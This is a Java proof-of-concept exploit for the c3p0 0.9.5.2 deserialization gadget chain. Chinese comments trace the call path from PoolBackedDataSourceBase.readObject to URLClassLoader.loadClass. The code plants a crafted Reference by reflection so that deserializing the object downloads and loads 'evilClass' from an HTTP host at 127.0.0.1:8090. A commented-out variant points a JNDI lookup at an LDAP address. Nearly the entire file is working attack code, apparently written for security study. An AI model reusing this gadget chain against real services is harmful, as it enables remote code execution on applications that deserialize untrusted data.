import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import util.Util;

import javax.naming.*;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;




/*
* 调用链:
* PoolBackedDataSourceBase.readObject()
*   ReferenceSerialized.getObject()
        ReferenceableUtils.referenceToObject()
            URLClassLoader.loadClass()
*
*
* */
/*
* 依赖版本:
* c3p0 : 0.9.5.2
*
*
* */
/*注意：这里写一下对这条链子的思考，最直接的就是得从PoolBackedDataSourceBase的writeObject开始观察，不然很难理解这其中的类型转换，
还有就是ReferenceIndirector#getObject中的lookup能不能利用jndi注入，但从这条来说应该是不行的，因为调用indirectForm方法中只有Reference可控。
* */
public class C3P0_URLClassLoader {
    private static final class MyPool implements ConnectionPoolDataSource, Referenceable {
        private String className;
        private String url;
        public MyPool(String className, String url) {
            this.className = className;
            this.url = url;
        }
        @Override
        public Reference getReference() throws NamingException {
            return new Reference("evilClass", this.className, this.url);
        }
        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }


    }
    public static void main(String[] args) throws Exception{
        PoolBackedDataSource poolBackedDataSource = new PoolBackedDataSource();
        ConnectionPoolDataSource connectionPoolDataSource = new MyPool(
                "evilClass","http://127.0.0.1:8090/"
        );
        Field field = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
        field.setAccessible(true);
        field.set(poolBackedDataSource, connectionPoolDataSource);
        Util.serialize(poolBackedDataSource);
        Util.unserialize();







//
//        Class<?> referenceSerializedClass = Class.forName("com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized");
//
//        Object referenceSerializedInstance = Reflections.createWithoutConstructor(referenceSerializedClass);
//        Field field = referenceSerializedClass.getDeclaredField("contextName");
//        field.setAccessible(true);
//        Name contextName = new CompositeName();
//        contextName.add("ldap://127.0.0.1:8085/exp");
//        field.set(referenceSerializedInstance,contextName);
//        Method getObjectMethod = referenceSerializedClass.getDeclaredMethod("getObject");
//        getObjectMethod.setAccessible(true);


    }
}
